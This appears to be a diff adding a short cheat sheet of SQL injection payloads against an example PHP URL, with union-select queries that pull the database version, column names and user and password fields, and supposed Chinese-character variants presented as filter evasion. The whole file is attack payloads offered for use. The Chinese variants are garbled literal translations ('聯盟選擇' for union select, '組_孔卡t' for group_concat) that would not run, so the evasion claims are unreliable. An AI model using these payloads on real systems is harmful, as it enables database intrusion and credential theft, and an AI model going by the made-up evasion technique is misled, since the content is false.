@@ -1,0 +1,22 @@
+Chinese character
+
+Simple evasion
+
+www.site.com/home.php?id=20 或 1=1--    # or 1=1 --
+www.site.com/home.php?id=20 聯盟選擇 1,2--   # union select 1,2
+@@版本 # @@version
+數據庫() # database()
+用戶() # user()
+組_孔卡t() # group_concat()
+從  # from
+哪裡  # where
+為了通過 # order by
+“ # '
+
+examples:
+
+union select 1,@@version,database(),4,5,6,7
+聯盟選擇 1,@@版本,數據庫(),4,5,6,7
+
+union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_schema=database()–
+聯盟選擇 1,組_孔卡t(user,password),3,4,5,6,7 從 information_schema.columns 哪裡 table_schema=數據庫()--
